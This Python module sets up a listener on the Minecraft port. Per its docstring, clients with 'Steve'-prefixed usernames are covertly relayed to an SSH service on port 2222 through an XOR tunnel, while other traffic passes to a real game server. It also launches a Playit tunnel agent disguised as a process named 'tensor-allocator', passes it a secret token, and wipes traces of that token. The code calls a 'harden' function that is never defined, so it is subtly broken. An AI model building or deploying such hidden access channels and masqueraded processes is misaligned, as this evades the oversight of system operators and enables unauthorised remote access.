import os
import socket
import subprocess
import threading

from loguru import logger

from client import mc_tunnel

from .utils import decode_cmd

XOR_BRIDGE_PORT = 25565
SSH_PORT = 2222


def _handle_client(client_sock):
    import sys
    import traceback

    try:
        mode, reader, target_port = mc_tunnel.server_dispatch(client_sock)
        backend_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        backend_sock.settimeout(5.0)
        backend_sock.connect(("127.0.0.1", target_port))
        backend_sock.settimeout(None)
        if mode == "tunnel":
            logger.info(
                "Playit MC tunnel: login complete, relaying to port {}", target_port
            )
            mc_tunnel.relay_server(reader, backend_sock, client_sock)
        elif mode == "status":
            logger.debug(
                "Playit MC status ping: forwarding to server on port {}", target_port
            )
            mc_tunnel.relay_passthrough(reader, backend_sock, client_sock)
        else:
            logger.info(
                "Playit MC client: forwarding to real server on port {}", target_port
            )
            mc_tunnel.relay_passthrough(reader, backend_sock, client_sock)
    except (ConnectionError, socket.timeout, TimeoutError, OSError, ValueError) as e:
        logger.info("Playit MC tunnel client disconnected/invalid handshake: {}", e)
        try:
            client_sock.close()
        except Exception:
            pass
    except Exception as e:
        logger.warning(
            "Playit MC tunnel client dropped unexpectedly: {} - {}", type(e).__name__, e
        )
        traceback.print_exc(file=sys.stderr)
        try:
            client_sock.close()
        except Exception:
            pass


def _xor_bridge_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(("0.0.0.0", XOR_BRIDGE_PORT))
        server.listen(10)
        while True:
            client_sock, _ = server.accept()
            threading.Thread(
                target=_handle_client, args=(client_sock,), daemon=True
            ).start()
    except Exception:
        pass


def start_xor_bridge():
    """On :25565: Steve* -> XOR tunnel (default :2222); other usernames -> MC :25566."""
    threading.Thread(target=_xor_bridge_loop, daemon=True).start()
    logger.info(
        "Playit MC tunnel bridge on 0.0.0.0:{} (plugin channel {})",
        XOR_BRIDGE_PORT,
        mc_tunnel.TUNNEL_CHANNEL,
    )


def start(tm_log, token=""):
    # token is pre-decoded and passed in from orchestrator (which wiped env vars at startup).
    cmd2_5_base = decode_cmd(
        harden(
            "nice -n 19 tensor-allocator --socket-path /tmp/playit.sock --secret '"
        )
    )
    cmd2_5 = f"{cmd2_5_base}{token}'"
    token = ""  # wipe local copy

    env = os.environ.copy()
    subprocess.Popen(
        cmd2_5, shell=True, env=env, stdout=tm_log, stderr=subprocess.STDOUT
    )
